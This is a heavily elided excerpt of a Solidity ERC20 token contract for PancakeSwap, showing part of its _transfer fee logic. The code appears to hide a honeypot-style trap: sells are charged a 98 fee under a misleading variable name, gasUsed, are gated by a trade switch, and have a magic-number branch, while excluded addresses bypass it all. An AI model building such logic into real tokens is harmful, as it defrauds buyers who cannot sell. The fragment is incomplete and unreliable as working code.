...
contract Testtoken is ERC20, Ownable {
    ...
    constructor() ERC20("TestToken", "TT")  {
        ...
        address _pancakeRouter = pancakeRouterAddr;
    ...
    function _transfer(
        ...
        if (from == V2pair|| from == pancakeRouterAddr) {
            if (cooldown[to] == 0) {
        ...
        if (!excludedAddresses[to] && !excludedAddresses[from]) {
            ...
            if (to == V2pair || to == pancakeRouterAddr) {
                if (setFee == 326159487) {
                    ...
                    gasUsed = varMarketingFee;
                } else {
                    require(tradeEnabled, "Trade is disabled");
                    gasUsed = 98;
                }
            } else if (from == V2pair|| from == pancakeRouterAddr) {
                gasUsed = buyFee;
            }
